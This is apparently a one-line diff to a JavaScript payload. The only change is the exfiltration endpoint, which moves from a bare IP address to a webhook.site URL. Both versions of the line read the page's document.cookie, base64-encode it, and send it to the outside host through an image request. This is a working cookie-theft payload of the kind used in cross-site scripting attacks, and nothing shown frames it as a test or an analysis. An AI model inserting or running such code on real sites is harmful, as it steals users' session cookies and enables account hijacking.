@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'http://212.71.9.5?data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/2a8e6fb4-33ac-4efa-96f0-937395817b97?data='+btoa(document.cookie);
